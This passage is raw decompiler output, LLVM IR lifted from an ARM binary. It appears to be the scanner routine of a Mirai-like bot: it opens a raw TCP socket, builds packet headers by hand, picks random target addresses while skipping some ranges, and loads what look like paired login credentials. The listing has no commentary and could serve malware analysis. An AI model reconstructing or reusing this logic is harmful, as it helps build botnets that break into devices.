  %v2_f38c = add i32 %v1_f38c, %v3_f388
  store i32 %v2_f38c, i32* %r3.global-to-local, align 4
  %v0_f390 = load i32, i32* %lr.global-to-local, align 4
  %v1_f390 = add i32 %v0_f390, 1
  store i32 %v1_f390, i32* @lr, align 4
  %v3_f394 = sdiv i32 %v2_f384, 256
  store i32 %v3_f394, i32* %r1.global-to-local, align 4
  %v0_f398 = load i32, i32* %r6.global-to-local, align 4
  %v2_f398 = add i32 %v2_f38c, 4
  %v3_f398 = inttoptr i32 %v2_f398 to i32*
  store i32 %v0_f398, i32* %v3_f398, align 4
  %v0_f39c = load i32, i32* @lr, align 4
  %v1_f39c = load i32, i32* @r8, align 4
  %v2_f39c = inttoptr i32 %v1_f39c to i32*
  store i32 %v0_f39c, i32* %v2_f39c, align 4
  %v0_f3a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_f3a0 = trunc i32 %v0_f3a0 to i8
  store i8 %v1_f3a0, i8* @global_var_1cad1.137, align 1
  %v0_f3a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f3a4 = trunc i32 %v0_f3a4 to i8
  store i8 %v1_f3a4, i8* bitcast (i8** @global_var_1cad0.136 to i8*), align 4
  store i32 %v3_f218, i32* @r4, align 4
  store i32 %v6_f218, i32* @r5, align 4
  store i32 %v9_f218, i32* @r6, align 4
  store i32 %v12_f218, i32* @r7, align 4
  store i32 %v15_f218, i32* @r8, align 4
  ret i32 ptrtoint (i8** @global_var_1cad0.136 to i32)

; uselistorder directives
  uselistorder i32 %v1_f308, { 0, 2, 3, 1 }
  uselistorder i32 %v1_f2dc, { 1, 0 }
  uselistorder i32 %v1_f29c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_f270, { 1, 0 }
  uselistorder i32 %v3_f234, { 1, 2, 0 }
  uselistorder i32 %v3_f22c, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i8*)* @function_111ec, { 0, 1, 9, 10, 11, 12, 13, 27, 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 (i32, i32, i32, i32)* @function_12814, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_f3bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f3bc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp269 = call i32 @__decompiler_undefined_function_0()
  %tmp276 = call i32 @__decompiler_undefined_function_0()
  %tmp277 = call i8* @__decompiler_undefined_function_2()
  %tmp278 = call i32 @__decompiler_undefined_function_0()
  %tmp279 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f3bc = load i32, i32* @r4, align 4
  store i32 %v3_f3bc, i32* %stack_var_-36, align 4
  %v6_f3bc = load i32, i32* @r5, align 4
  %v18_f3bc = load i32, i32* @sb, align 4
  %v21_f3bc = load i32, i32* @sl, align 4
  %v0_f3c4 = call i32 @function_11b1c()
  store i32 %v0_f3c4, i32* %r0.global-to-local, align 4
  %v7_f3c8 = icmp eq i32 %v0_f3c4, -1
  %. = zext i1 %v7_f3c8 to i32
  %tmp310 = icmp slt i32 %v0_f3c4, 1
  %storemerge266 = select i1 %tmp310, i32 %., i32 1
  store i32 %storemerge266, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1cb40.139 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3e4 = icmp eq i32 %storemerge266, 0
  store i1 %v2_f3e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_f3c4, i32* @global_var_1cb40.139, align 4
  br i1 %v2_f3e4, label %dec_label_pc_f3f8, label %dec_label_pc_f3f0

dec_label_pc_f3f0:                                ; preds = %dec_label_pc_f3bc
  store i32 %v3_f3bc, i32* %r4.global-to-local, align 4
  store i32 %v6_f3bc, i32* @r5, align 4
  store i32 %v18_f3bc, i32* @sb, align 4
  store i32 %v21_f3bc, i32* %sl.global-to-local, align 4
  ret i32 %v0_f3c4

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3bc
  %v0_f3f8 = call i32 @function_114a4()
  store i32 %v0_f3f8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cb1c.49 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_f3f8, i32* @global_var_1cb1c.49, align 4
  %v1_f404 = call i32 @function_e9d0(i32 %v0_f3f8)
  %v0_f408 = load i32, i32* @r4, align 4
  store i32 %v0_f408, i32* %r0.global-to-local, align 4
  %v1_f40c = inttoptr i32 %v0_f408 to i32*
  %v2_f40c = call i32 @function_11dc0(i32* %v1_f40c)
  store i32 ptrtoint (i32* @global_var_1cad4.130 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_f40c, i32* @global_var_1cad4.130, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_f420 = call i32 @function_126cc(i32 256, i32 288)
  store i32 %v2_f420, i32* %lr.global-to-local, align 4
  %v0_f42c = load i32, i32* @r4, align 4
  store i32 %v0_f42c, i32* %stack_var_-52, align 4
  store i32 %v2_f420, i32* @global_var_1cb38.143, align 4
  store i32 %v0_f42c, i32* %r3.global-to-local, align 4
  store i32 %v0_f42c, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_f42c, i32* %ip.global-to-local, align 4
  %v1_f444 = add i32 %v2_f420, 4
  store i32 %v1_f444, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %dec_label_pc_f448.dec_label_pc_f448_crit_edge, %dec_label_pc_f3f8
  %v0_f460 = phi i32 [ %v0_f460.pre, %dec_label_pc_f448.dec_label_pc_f448_crit_edge ], [ %v0_f42c, %dec_label_pc_f3f8 ]
  %v0_f450 = phi i32 [ %v0_f468, %dec_label_pc_f448.dec_label_pc_f448_crit_edge ], [ %v0_f42c, %dec_label_pc_f3f8 ]
  %v1_f458 = phi i32 [ %v1_f458.pre, %dec_label_pc_f448.dec_label_pc_f448_crit_edge ], [ %v2_f420, %dec_label_pc_f3f8 ]
  %v3_f448 = mul i32 %v0_f450, 256
  store i32 %v3_f448, i32* %r2.global-to-local, align 4
  %v1_f450 = add i32 %v0_f450, 1
  store i32 %v1_f450, i32* %ip.global-to-local, align 4
  %v2_f454 = mul i32 %v0_f450, 288
  %v2_f458 = add i32 %v1_f458, 12
  %v2_f460 = add i32 %v2_f458, %v2_f454
  %v3_f460 = inttoptr i32 %v2_f460 to i32*
  store i32 %v0_f460, i32* %v3_f460, align 4
  %v0_f464 = load i32, i32* %r0.global-to-local, align 4
  %v1_f464 = load i32, i32* %r1.global-to-local, align 4
  %v2_f464 = inttoptr i32 %v1_f464 to i32*
  store i32 %v0_f464, i32* %v2_f464, align 4
  %v3_f464 = load i32, i32* %r1.global-to-local, align 4
  %v4_f464 = add i32 %v3_f464, 288
  store i32 %v4_f464, i32* %r1.global-to-local, align 4
  %v0_f468 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f468, i32* %r3.global-to-local, align 4
  %v7_f46c = icmp sgt i32 %v1_f450, 255
  br i1 %v7_f46c, label %dec_label_pc_f470, label %dec_label_pc_f448.dec_label_pc_f448_crit_edge

dec_label_pc_f448.dec_label_pc_f448_crit_edge:    ; preds = %dec_label_pc_f448
  %v1_f458.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_f460.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f448

dec_label_pc_f470:                                ; preds = %dec_label_pc_f448
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_f468, i32* %stack_var_-52, align 4
  %v3_f480 = call i32 @function_123e0(i32 2, i32 3, i32 6)
  store i32 %v3_f480, i32* %r0.global-to-local, align 4
  %v2_f488 = icmp eq i32 %v3_f480, -1
  store i1 %v2_f488, i1* %cpsr_c.global-to-local, align 1
  %v7_f488 = icmp eq i32 %v3_f480, -1
  store i1 %v7_f488, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f480, i32* @r4, align 4
  store i32 %v3_f480, i32* @global_var_1cb3c.145, align 4
  br i1 %v7_f488, label %dec_label_pc_fcb4, label %dec_label_pc_f498

dec_label_pc_f498:                                ; preds = %dec_label_pc_f470
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_f49c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f49c, i32* @r2, align 4
  %v2_f4a0 = call i32 @function_11a2c(i32 %v3_f480, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_f4a8 = or i32 %v2_f4a0, 2048
  store i32 %v1_f4a8, i32* @r2, align 4
  %v0_f4ac = load i32, i32* @r4, align 4
  store i32 %v0_f4ac, i32* %r0.global-to-local, align 4
  %v2_f4b0 = call i32 @function_11a2c(i32 %v0_f4ac, i32 4)
  store i32 1, i32* %ip.global-to-local, align 4
  %v2_f4bc = load i32, i32* @global_var_1cb3c.145, align 4
  store i32 %v2_f4bc, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_f4c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f4c4, i32* %r1.global-to-local, align 4
  %v2_f4c8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_f4c8, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v6_f4d8 = call i32 @function_123b0(i32 %v2_f4bc, i32 %v0_f4c4, i32 3, i32* nonnull %stack_var_-52, i32 4)
  store i32 %v6_f4d8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4dc = icmp eq i32 %v6_f4d8, 0
  store i1 %v2_f4dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4dc, label %dec_label_pc_f4e4, label %dec_label_pc_fca8

dec_label_pc_f4e4:                                ; preds = %dec_label_pc_f498, %dec_label_pc_f4e4
  %v0_f4e4 = call i32 @function_e978()
  %v3_f4e8 = mul i32 %v0_f4e4, 65536
  store i32 %v3_f4e8, i32* %r0.global-to-local, align 4
  %v1_f4f4 = mul i32 %v0_f4e4, 256
  %v3_f4f8 = and i32 %v1_f4f4, 65280
  %tmp313 = udiv i32 %v0_f4e4, 256
  %v4_f4fc = urem i32 %tmp313, 256
  %v5_f4fc = or i32 %v4_f4fc, %v3_f4f8
  store i32 %v5_f4fc, i32* %r3.global-to-local, align 4
  %v2_f500 = icmp ugt i32 %v5_f4fc, 1023
  store i1 %v2_f500, i1* %cpsr_c.global-to-local, align 1
  %v7_f500 = icmp eq i32 %v5_f4fc, 1024
  store i1 %v7_f500, i1* %cpsr_z.global-to-local, align 1
  %v3_f504 = icmp ult i32 %v5_f4fc, 1022
  br i1 %v3_f504, label %dec_label_pc_f4e4, label %dec_label_pc_f508

dec_label_pc_f508:                                ; preds = %dec_label_pc_f4e4
  %v5_f4f0.le = trunc i32 %v0_f4e4 to i8
  store i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i8 69, i8* bitcast (i8** @global_var_1caa4.147 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1caa7.148 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1caa6.149 to i8*), align 4
  %v0_f53c = call i32 @function_e978()
  %v1_f53c = trunc i32 %v0_f53c to i8
  store i32 %v0_f53c, i32* %r0.global-to-local, align 4
  %v3_f544 = load i8, i8* @global_var_1cac4.152, align 1
  store i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32* %lr.global-to-local, align 4
  %v4_f54c265 = udiv i32 %v0_f53c, 256
  %v1_f550 = trunc i32 %v4_f54c265 to i8
  store i8 %v1_f550, i8* bitcast (i32* @global_var_1caa9.153 to i8*), align 4
  %v4_f554 = sext i8 %v5_f4f0.le to i32
  store i8 6, i8* bitcast (i32* @global_var_1caad.154 to i8*), align 4
  %tmp = urem i8 %v3_f544, 16
  %v1_f560 = zext i8 %tmp to i32
  store i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32* %r2.global-to-local, align 4
  %v1_f568 = and i32 %v4_f554, 128
  %v2_f568 = icmp ne i32 %v1_f568, 0
  store i1 %v2_f568, i1* %cpsr_c.global-to-local, align 1
  %v3_f568 = sdiv i32 %v4_f554, 256
  store i32 %v3_f568, i32* %ip.global-to-local, align 4
  %v1_f56c = or i32 %v1_f560, 80
  store i32 %v1_f56c, i32* %r1.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_1caac.155 to i8*), align 4
  %v1_f578 = trunc i32 %v1_f56c to i8
  store i8 %v1_f578, i8* @global_var_1cac4.152, align 1
  store i8 23, i8* bitcast (i32* @global_var_1cabb.156 to i8*), align 4
  store i32 %v4_f554, i32* %r3.global-to-local, align 4
  %v1_f588 = trunc i32 %v3_f568 to i8
  store i8 %v1_f588, i8* bitcast (i32* @global_var_1cab9.157 to i8*), align 4
  store i8 %v1_f53c, i8* bitcast (i32* @global_var_1caa8.158 to i8*), align 4
  store i8 %v5_f4f0.le, i8* bitcast (i32* @global_var_1cab8.151 to i8*), align 4
  %v0_f594 = load i32, i32* @r5, align 4
  %v1_f594 = trunc i32 %v0_f594 to i8
  store i8 %v1_f594, i8* bitcast (i32* @global_var_1caba.159 to i8*), align 4
  %v0_f598 = call i32 @function_e978()
  %v1_f598 = trunc i32 %v0_f598 to i8
  %v3_f5a0 = load i8, i8* @global_var_1cac5.160, align 1
  %v4_f5a0 = zext i8 %v3_f5a0 to i32
  store i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32* @lr, align 4
  %v2_f5a8 = and i32 %v0_f598, 128
  %v3_f5a8 = icmp ne i32 %v2_f5a8, 0
  store i1 %v3_f5a8, i1* %cpsr_c.global-to-local, align 1
  %v4_f5a8 = sdiv i32 %v0_f598, 256
  store i32 %v4_f5a8, i32* %ip.global-to-local, align 4
  %v1_f5ac = or i32 %v4_f5a0, 2
  store i32 %v1_f5ac, i32* %r3.global-to-local, align 4
  store i32 %v0_f598, i32* @r4, align 4
  %v1_f5b4 = trunc i32 %v4_f5a8 to i8
  store i8 %v1_f5b4, i8* bitcast (i32* @global_var_1cac7.161 to i8*), align 4
  %v1_f5b8 = trunc i32 %v1_f5ac to i8
  store i8 %v1_f5b8, i8* @global_var_1cac5.160, align 1
  store i8 %v1_f598, i8* bitcast (i32* @global_var_1cac6.162 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14424.166 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_f5cc = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32 ptrtoint (i32* @global_var_14424.166 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1439c.168 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_f5dc = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32 ptrtoint ([5 x i8]* @global_var_1439c.168 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_143a4.170 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f5ec = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32 ptrtoint ([9 x i8]* @global_var_143a4.170 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_143b0.172 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_143b0.172 to i32), i32* %r1.global-to-local, align 4
  %v5_f5fc = call i32 @function_f218(i32 ptrtoint ([7 x i8]* @global_var_143b0.172 to i32), i32 ptrtoint ([7 x i8]* @global_var_143b0.172 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14424.166 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_f60c = call i32 @function_f218(i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), i32 ptrtoint (i32* @global_var_14424.166 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_143c0.176 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f61c = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32 ptrtoint ([9 x i8]* @global_var_143c0.176 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_143cc.178 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_143cc.178 to i32), i32* %r1.global-to-local, align 4
  %v5_f62c = call i32 @function_f218(i32 ptrtoint ([6 x i8]* @global_var_143cc.178 to i32), i32 ptrtoint ([6 x i8]* @global_var_143cc.178 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_143d4.180 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f63c = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32 ptrtoint ([6 x i8]* @global_var_143d4.180 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_143dc.182 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_143dc.182 to i32), i32* %r1.global-to-local, align 4
  %v5_f64c = call i32 @function_f218(i32 ptrtoint ([8 x i8]* @global_var_143dc.182 to i32), i32 ptrtoint ([8 x i8]* @global_var_143dc.182 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_f65c = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143e4.184 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_f66c = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32 ptrtoint (i32* @global_var_143e4.184 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_143f4.186 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f67c = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), i32 ptrtoint ([6 x i8]* @global_var_143f4.186 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_143fc.188 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143fc.188 to i32), i32* %r1.global-to-local, align 4
  %v5_f68c = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_143fc.188 to i32), i32 ptrtoint ([5 x i8]* @global_var_143fc.188 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_143fc.188 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_143f4.186 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f69c = call i32 @function_f218(i32 ptrtoint ([5 x i8]* @global_var_143fc.188 to i32), i32 ptrtoint ([6 x i8]* @global_var_143f4.186 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14404.190 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_f6ac = call i32 @function_f218(i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), i32 ptrtoint (i32* @global_var_14404.190 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14410.192 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_f6bc = call i32 @function_f218(i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), i32 ptrtoint (i32* @global_var_14410.192 to i32), i32 15)
  %v2_f6c4 = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_f6c4, i32* %r0.global-to-local, align 4
  %v2_f6c8 = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_f6c8, i32* %r1.global-to-local, align 4
  %tmp314 = bitcast i32* %stack_var_-1842 to i8*
  br label %dec_label_pc_f6d4

dec_label_pc_f6d4:                                ; preds = %dec_label_pc_fdbc, %dec_label_pc_f508
  %stack_var_-1872.0 = phi i32 [ %tmp276, %dec_label_pc_f508 ], [ %stack_var_-1872.2, %dec_label_pc_fdbc ]
  %stack_var_-1884.0 = phi i8* [ %tmp314, %dec_label_pc_f508 ], [ %stack_var_-1884.1, %dec_label_pc_fdbc ]
  %v0_fa88 = phi i32 [ %v2_f6c4, %dec_label_pc_f508 ], [ %stack_var_-1880.1, %dec_label_pc_fdbc ]
  %stack_var_-1876.0 = phi i8 [ %v5_f4f0.le, %dec_label_pc_f508 ], [ %stack_var_-1876.1, %dec_label_pc_fdbc ]
  store i32 ptrtoint (i32* @global_var_1cad4.130 to i32), i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1872.0, i32* %r3.global-to-local, align 4
  %v2_f6dc = load i32, i32* @global_var_1cad4.130, align 4
  store i32 %v2_f6dc, i32* @r8, align 4
  %v3_f6e0 = icmp uge i32 %stack_var_-1872.0, %v2_f6dc
  store i1 %v3_f6e0, i1* %cpsr_c.global-to-local, align 1
  %v9_f6e0 = icmp eq i32 %stack_var_-1872.0, %v2_f6dc
  store i1 %v9_f6e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f6e0, label %dec_label_pc_fa10, label %dec_label_pc_f6e8

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f6d4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  %v2_f9e0 = ptrtoint i32* %stack_var_-92 to i32
  br label %dec_label_pc_f6f4

dec_label_pc_f6f4:                                ; preds = %.thread65.dec_label_pc_f6f4_crit_edge, %dec_label_pc_f6e8
  %v0_f6f4 = phi i32 [ %v0_f6f4.pre, %.thread65.dec_label_pc_f6f4_crit_edge ], [ 0, %dec_label_pc_f6e8 ]
  store i32 %v0_f6f4, i32* %stack_var_-92, align 4
  store i32 %v0_f6f4, i32* %stack_var_-84, align 4
  %v0_f704 = call i32 @function_e978()
  %v1_f704 = trunc i32 %v0_f704 to i8
  store i32 %v0_f704, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cb1c.49 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32* %r1.global-to-local, align 4
  %v2_f710 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_f710, i32* %r2.global-to-local, align 4
  %v2_f714 = and i32 %v0_f704, 128
  %v3_f714 = icmp ne i32 %v2_f714, 0
  store i1 %v3_f714, i1* %cpsr_c.global-to-local, align 1
  %v4_f714 = sdiv i32 %v0_f704, 256
  store i32 %v4_f714, i32* %r3.global-to-local, align 4
  %v1_f718 = trunc i32 %v4_f714 to i8
  store i8 %v1_f718, i8* bitcast (i32* @global_var_1caa9.153 to i8*), align 4
  store i32 %v2_f710, i32* @global_var_1cab0.193, align 4
  store i8 %v1_f704, i8* bitcast (i32* @global_var_1caa8.158 to i8*), align 4
  br label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f87c, %dec_label_pc_f754, %dec_label_pc_f8b0, %dec_label_pc_f8a4, %dec_label_pc_f898, %dec_label_pc_f88c, %.thread50, %.thread34, %.thread30, %.thread26, %bb340, %bb339, %bb338, %bb337, %bb336, %bb335, %bb334, %bb333, %bb332, %bb331, %dec_label_pc_f7f0, %dec_label_pc_f7e8, %bb325, %dec_label_pc_f7b8, %dec_label_pc_f794, %bb318, %dec_label_pc_f764, %bb317, %dec_label_pc_f74c, %bb316, %bb342, %dec_label_pc_f6f4
  %v0_f724 = call i32 @function_e978()
  store i32 %v0_f724, i32* %r0.global-to-local, align 4
  %v1_f728 = urem i32 %v0_f724, 256
  store i32 %v1_f728, i32* %r1.global-to-local, align 4
  %v3_f72c = udiv i32 %v0_f724, 256
  store i32 %v3_f72c, i32* %r3.global-to-local, align 4
  %v3_f730 = udiv i32 %v0_f724, 65536
  store i32 %v3_f730, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f734 = icmp eq i32 %v1_f728, 0
  store i1 %v2_f734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f734, label %bb316, label %bb315

bb315:                                            ; preds = %dec_label_pc_f724
  %v3_f738 = icmp ugt i32 %v1_f728, 126
  store i1 %v3_f738, i1* %cpsr_c.global-to-local, align 1
  %v8_f738 = icmp eq i32 %v1_f728, 127
  store i1 %v8_f738, i1* %cpsr_z.global-to-local, align 1
  br label %bb316

bb316:                                            ; preds = %dec_label_pc_f724, %bb315
  %v0_f748 = phi i1 [ true, %dec_label_pc_f724 ], [ %v8_f738, %bb315 ]
  %v1_f73c = urem i32 %v3_f72c, 256
  store i32 %v1_f73c, i32* %ip.global-to-local, align 4
  %v1_f740 = urem i32 %v3_f730, 256
  store i32 %v1_f740, i32* %r2.global-to-local, align 4
  %v1_f744 = and i32 %v0_f724, 8388608
  %v2_f744 = icmp ne i32 %v1_f744, 0
  store i1 %v2_f744, i1* %cpsr_c.global-to-local, align 1
  %v3_f744 = udiv i32 %v0_f724, 16777216
  store i32 %v3_f744, i32* %r0.global-to-local, align 4
  br i1 %v0_f748, label %dec_label_pc_f724, label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %bb316
  %v2_f74c = icmp ugt i32 %v1_f728, 2
  store i1 %v2_f74c, i1* %cpsr_c.global-to-local, align 1
  %v7_f74c = icmp eq i32 %v1_f728, 3
  store i1 %v7_f74c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f74c, label %dec_label_pc_f724, label %dec_label_pc_f754

dec_label_pc_f754:                                ; preds = %dec_label_pc_f74c
  %v1_f754 = add nsw i32 %v1_f728, -15
  store i32 %v1_f754, i32* %r3.global-to-local, align 4
  %v2_f758 = icmp ugt i32 %v1_f728, 55
  store i1 %v2_f758, i1* %cpsr_c.global-to-local, align 1
  %v7_f758 = icmp eq i32 %v1_f728, 56
  store i1 %v7_f758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f758, label %dec_label_pc_f724, label %bb317

bb317:                                            ; preds = %dec_label_pc_f754
  %v3_f75c = icmp ne i32 %v1_f754, 0
  store i1 %v3_f75c, i1* %cpsr_c.global-to-local, align 1
  %v8_f75c = icmp eq i32 %v1_f754, 1
